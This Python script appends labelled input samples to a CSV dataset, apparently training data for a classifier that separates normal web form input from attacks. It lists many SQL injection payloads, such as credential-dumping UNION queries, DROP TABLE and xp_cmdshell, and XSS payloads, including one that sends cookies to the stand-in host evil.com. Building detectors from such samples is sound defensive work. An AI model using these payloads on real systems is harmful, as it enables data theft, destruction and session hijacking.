import csv
import os

# Large set of real world attack payloads
new_samples = [
    # More normal name inputs
("saundhi gupta", "NORMAL"),
("rahul sharma", "NORMAL"),
("priya singh", "NORMAL"),
("amit kumar", "NORMAL"),
("neha verma", "NORMAL"),
("raj patel", "NORMAL"),
("sunita devi", "NORMAL"),
("vikram mehta", "NORMAL"),
("pooja reddy", "NORMAL"),
("arjun nair", "NORMAL"),
    # Normal inputs (30 more)
    ("hello", "NORMAL"),
    ("search", "NORMAL"),
    ("username", "NORMAL"),
    ("password123", "NORMAL"),
    ("john doe", "NORMAL"),
    ("product search", "NORMAL"),
    ("order 1234", "NORMAL"),
    ("contact us", "NORMAL"),
    ("about page", "NORMAL"),
    ("home", "NORMAL"),
    ("login", "NORMAL"),
    ("register", "NORMAL"),
    ("profile", "NORMAL"),
    ("settings", "NORMAL"),
    ("dashboard", "NORMAL"),
    ("2", "NORMAL"),
    ("3", "NORMAL"),
    ("test", "NORMAL"),
    ("sample input", "NORMAL"),
    ("first name", "NORMAL"),
    ("last name", "NORMAL"),
    ("email address", "NORMAL"),
    ("phone number", "NORMAL"),
    ("street address", "NORMAL"),
    ("city name", "NORMAL"),
    ("country", "NORMAL"),
    ("zip code", "NORMAL"),
    ("date of birth", "NORMAL"),
    ("user 123", "NORMAL"),
    ("product 456", "NORMAL"),

    # SQL Injection payloads (40 more)
    ("' OR '1'='1' --", "SQL_INJECTION"),
    ("' OR 1=1 --", "SQL_INJECTION"),
    ("admin' --", "SQL_INJECTION"),
    ("' OR 'x'='x", "SQL_INJECTION"),
    ("1' AND 1=1 --", "SQL_INJECTION"),
    ("1' AND 1=2 --", "SQL_INJECTION"),
    ("' UNION SELECT 1,2,3 --", "SQL_INJECTION"),
    ("' UNION SELECT null,null,null --", "SQL_INJECTION"),
    ("' UNION SELECT username,password,3 FROM users --", "SQL_INJECTION"),
    ("1; DROP TABLE users --", "SQL_INJECTION"),
    ("1; SELECT * FROM information_schema.tables --", "SQL_INJECTION"),
    ("' OR sleep(5) --", "SQL_INJECTION"),
    ("' OR benchmark(1000000,MD5(1)) --", "SQL_INJECTION"),
    ("1' ORDER BY 1 --", "SQL_INJECTION"),
    ("1' ORDER BY 2 --", "SQL_INJECTION"),
    ("1' ORDER BY 3 --", "SQL_INJECTION"),
    ("' GROUP BY 1 --", "SQL_INJECTION"),
    ("' HAVING 1=1 --", "SQL_INJECTION"),
    ("' AND 1=1 --", "SQL_INJECTION"),
    ("' AND 1=2 --", "SQL_INJECTION"),
    ("1' AND '1'='1", "SQL_INJECTION"),
    ("1' AND '1'='2", "SQL_INJECTION"),
    ("' OR 'unusual'='unusual", "SQL_INJECTION"),
    ("' OR 2>1 --", "SQL_INJECTION"),
    ("' OR 'text'='text' --", "SQL_INJECTION"),
    ("1 AND 1=1", "SQL_INJECTION"),
    ("1 AND 1=2", "SQL_INJECTION"),
    ("1 OR 1=1", "SQL_INJECTION"),
    ("' INSERT INTO users VALUES ('hacked','hacked') --", "SQL_INJECTION"),
    ("' UPDATE users SET password='hacked' --", "SQL_INJECTION"),
    ("' DELETE FROM users --", "SQL_INJECTION"),
    ("'; EXEC xp_cmdshell('dir') --", "SQL_INJECTION"),
    ("' AND extractvalue(1,concat(0x7e,version())) --", "SQL_INJECTION"),
    ("' AND updatexml(1,concat(0x7e,version()),1) --", "SQL_INJECTION"),
    ("1' AND substring(username,1,1)='a' --", "SQL_INJECTION"),
    ("1' AND ascii(substring(password,1,1))>97 --", "SQL_INJECTION"),
    ("' UNION SELECT table_name FROM information_schema.tables --", "SQL_INJECTION"),
    ("' UNION SELECT column_name FROM information_schema.columns --", "SQL_INJECTION"),
    ("' UNION SELECT user() --", "SQL_INJECTION"),
    ("' UNION SELECT version() --", "SQL_INJECTION"),

    # XSS payloads (40 more)
    ("<script>alert(1)</script>", "XSS"),
    ("<script>alert('hello')</script>", "XSS"),
    ("<script>document.write('hacked')</script>", "XSS"),
    ("<script>window.location='http://evil.com'</script>", "XSS"),
    ("<script>fetch('http://evil.com?c='+document.cookie)</script>", "XSS"),
    ("<img src=x onerror=alert(1)>", "XSS"),
    ("<img src=x onerror=alert(document.cookie)>", "XSS"),
    ("<img src='javascript:alert(1)'>", "XSS"),
    ("<body onload=alert(1)>", "XSS"),
    ("<body onload=alert(document.cookie)>", "XSS"),
    ("<svg onload=alert(1)>", "XSS"),
    ("<svg onload=alert(document.cookie)>", "XSS"),
    ("<iframe src='javascript:alert(1)'>", "XSS"),
    ("<iframe onload=alert(1)>", "XSS"),
    ("javascript:alert(1)", "XSS"),
    ("javascript:alert(document.cookie)", "XSS"),
    ("<input onfocus=alert(1) autofocus>", "XSS"),
    ("<input onblur=alert(1)>", "XSS"),
    ("<select onchange=alert(1)>", "XSS"),
    ("<textarea onfocus=alert(1) autofocus>", "XSS"),
    ("<keygen onfocus=alert(1) autofocus>", "XSS"),
    ("<video src=x onerror=alert(1)>", "XSS"),
    ("<audio src=x onerror=alert(1)>", "XSS"),
    ("<details open ontoggle=alert(1)>", "XSS"),
    ("<marquee onstart=alert(1)>", "XSS"),
    ("'\"><script>alert(1)</script>", "XSS"),
    ("'\"><img src=x onerror=alert(1)>", "XSS"),
    ("<scRipt>alert(1)</scRipt>", "XSS"),
    ("<SCRIPT>alert(1)</SCRIPT>", "XSS"),
    ("<script >alert(1)</script >", "XSS"),
    ("<%2fscript><script>alert(1)</script>", "XSS"),
    ("<script/src='http://evil.com/xss.js'>", "XSS"),
    ("<script>eval(atob('YWxlcnQoMSk='))</script>", "XSS"),
    ("<script>setTimeout('alert(1)',0)</script>", "XSS"),
    ("<script>setInterval('alert(1)',1000)</script>", "XSS"),
    ("<a href='javascript:alert(1)'>click</a>", "XSS"),
    ("<a href=javascript:alert(1)>click</a>", "XSS"),
    ("<div style='background:url(javascript:alert(1))'>", "XSS"),
    ("<link rel='stylesheet' href='javascript:alert(1)'>", "XSS"),
    ("<table background='javascript:alert(1)'>", "XSS"),
]

# Read existing dataset
existing = []
with open("data/dataset.csv", "r") as f:
    reader = csv.reader(f)
    next(reader)  # skip header
    for row in reader:
        existing.append((row[0], row[1]))

# Combine old + new
all_samples = existing + new_samples

# Write combined dataset
with open("data/dataset.csv", "w", newline="") as f:
    writer = csv.writer(f)
    writer.writerow(["input", "attack_type"])
    for sample in all_samples:
        writer.writerow([sample[0], sample[1]])

# Show breakdown
normal = sum(1 for s in all_samples if s[1] == "NORMAL")
sqli = sum(1 for s in all_samples if s[1] == "SQL_INJECTION")
xss = sum(1 for s in all_samples if s[1] == "XSS")

print(f"✅ Dataset expanded to {len(all_samples)} samples!")
print(f"\nBreakdown:")
print(f"  NORMAL:        {normal} samples")
print(f"  SQL_INJECTION: {sqli} samples")
print(f"  XSS:           {xss} samples")